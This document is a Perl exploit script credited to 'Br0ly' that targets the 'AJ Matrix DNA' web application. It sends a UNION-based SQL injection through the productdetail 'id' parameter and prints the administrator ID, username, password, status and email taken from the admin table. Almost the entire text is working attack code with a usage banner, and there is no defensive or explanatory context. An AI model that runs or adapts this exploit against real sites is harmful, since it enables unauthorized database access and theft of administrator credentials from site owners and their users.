
  use IO::Socket::INET;
  use LWP::UserAgent;
  
   my $host    = $ARGV[0];
   my $sql_path = &quot;/index.php?do=productdetail&amp;id=&quot;;
    
  
  if (@ARGV &lt; 1) {
      &amp;banner();
      &amp;help(&quot;-1&quot;);
  }

  elsif(cheek($host) == 1) {
	  &amp;banner();
	  &amp;xploit($host,$sql_path);
  }
  
  else {
      &amp;banner();
      help(&quot;-2&quot;);
  }
  
  sub xploit() {

      my $host     = $_[0];
      my $sql_path = $_[1];

      print &quot;[+] Getting the id,login,pass,status of the admin.\n&quot;;

      my $sql_atk = $host.$sql_path.&quot;-9999+union+all+select+0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,concat(0x6272306c79,0x3a,admin_id,0x3a,admin_username,0x3a,admin_password,0x3a,admin_status,0x3a,admin_email,0x3a,0x6272306c79)+from+ajmatrix_admin_table--&quot;;
      my $sql_get = get_url($sql_atk);
      my $connect = tag($sql_get); 
      
      if($connect =~ /br0ly:(.+):(.+):(.+):(.+):(.+):br0ly/) {
	print &quot;[+] ID     = $1\n&quot;;
	print &quot;[+] User   = $2\n&quot;;
	print &quot;[+] Pass   = $3\n&quot;;
	print &quot;[+] Status = $4\n&quot;;
	print &quot;[+] Email  = $5\n&quot;;
	exit(0);
      }
      else {
	print &quot;[-] Exploit, Fail\n&quot;;
	exit(0);
      
      }
 }

   sub get_url() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
  }

  sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
  }

  sub cheek() {
    my $host  = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
  }

  sub help() {

    my $error = $_[0];
    if ($error == -1) {
        print &quot;\n[-] Error, missed some arguments !\n\n&quot;;
    }
    
    elsif ($error == -2) {

        print &quot;\n[-] Error, Bad arguments !\n&quot;;
    }
  
    print &quot;[*] Usage : perl $0 http://localhost/ajmatrixdna/\n\n&quot;;
    print &quot;    Ex:     perl $0 http://localhost/ajmatrixdna/\n\n&quot;;
    exit(0);
  }

  sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------------------\n&quot;.
          &quot;   -AJ Matrix DNA		           \n&quot;.
          &quot;   -Sql Injection                       \n&quot;.
          &quot;   -by Br0ly                            \n&quot;.
          &quot;  --------------------------------------\n\n&quot;;
  }
